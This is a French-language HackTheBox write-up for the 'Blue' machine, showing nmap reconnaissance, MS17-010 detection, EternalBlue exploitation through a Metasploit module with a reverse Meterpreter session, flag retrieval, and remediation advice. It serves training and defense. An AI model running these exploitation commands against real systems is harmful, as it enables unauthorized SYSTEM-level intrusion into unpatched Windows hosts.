# Blue — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows 7 Professional SP1 |
| **Difficulté** | Easy |
| **Date** | 2026-09-26 |
| **Vecteur** | Débordement mémoire noyau via SMBv1 (EternalBlue) |
| **CVE** | CVE-2017-0143 (MS17-010) |

---

## TL;DR

La cible expose **SMBv1** sur un **Windows 7 SP1** non corrigé, vulnérable à **MS17-010 / EternalBlue**. Une mauvaise conversion de type dans le traitement des requêtes SMBv1 provoque un **débordement mémoire côté noyau**, permettant l'exécution de code en `NT AUTHORITY\SYSTEM` → **RCE SYSTEM**, sans authentification ni élévation de privilèges.

---

## 1. Reconnaissance

### Scan nmap de référence

```bash
nmap -sC -sV -p- -oA nmap/blue <IP>
```

Ports notables :

| Port | Service | Version |
| --- | --- | --- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | **Windows 7 Professional 7601 SP1** |
| 49152-49157 | msrpc | ports RPC dynamiques (bruit normal Windows) |

Scripts d'hôte utiles :

```
smb-os-discovery : Windows 7 Professional 7601 SP1 — Computer name: haris-PC
smb-security-mode : message_signing: disabled (dangerous, but default)
```

> Le trio 135/139/445 = machine Windows classique. L'action est sur le **445 (SMB)**,
> et la version **Windows 7 SP1** oriente vers une vulnérabilité SMB connue.

---

## 2. Confirmation de la vulnérabilité

Détection non intrusive via le script NSE dédié :

```bash
nmap --script smb-vuln-ms17-010 -p445 <IP>
```

Résultat :

```
smb-vuln-ms17-010:
  VULNERABLE:
    State: VULNERABLE
    IDs: CVE:CVE-2017-0143
    Risk factor: HIGH
```

> Le script envoie une transaction SMBv1 invalide sur `IPC$` et lit le code d'erreur :
> `STATUS_INSUFF_SERVER_RESOURCES` = serveur non patché. Détection par empreinte de
> réponse, sans toucher à la mémoire (donc sans risque).

---

## 3. Exploitation

### Via Metasploit

```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST tun0
check
run
```

Vérification de l'accès obtenu (Meterpreter) :

```
getuid
# Server username: NT AUTHORITY\SYSTEM
```

> EternalBlue manipule la mémoire noyau : l'exploit peut échouer au 1er essai puis
> réussir au 2e. En production, à ne lancer qu'avec d'infinies précautions (risque de BSOD).

---

## 4. Post-exploitation

```cmd
type C:\Users\haris\Desktop\user.txt          # flag user
type C:\Users\Administrator\Desktop\root.txt  # flag root
```

Depuis un shell SYSTEM, les deux flags sont accessibles (y compris le dossier Administrator).

> Les flags ne sont pas publiés (règle HTB — pas de spoiler).

---

## 5. Remédiation

- **Appliquer le correctif MS17-010** (Windows Update).
- **Désactiver SMBv1** — protocole obsolète, à supprimer.
- **Activer la signature SMB** (obligatoire, pas seulement supportée).
- Segmenter et ne pas exposer SMB hors des zones maîtrisées.
- Migrer les OS en fin de support (Windows 7).

---

## 6. Leçons

- Les **host script results** de `-sC` livrent souvent la faiblesse sur un plateau
  (ici signature SMB désactivée + version de l'OS).
- **Détecter avant d'exploiter** : le script `vuln` confirme sans risque, l'exploit
  déclenche la faille (potentiellement destructeur).
- Famille **corruption mémoire** (comme MS08-067), à opposer à l'injection de
  commande de Lame.

---

## Références

- CVE-2017-0143 — <https://nvd.nist.gov/vuln/detail/CVE-2017-0143>
- Microsoft MS17-010 — <https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010>
- Module Metasploit : `exploit/windows/smb/ms17_010_eternalblue`
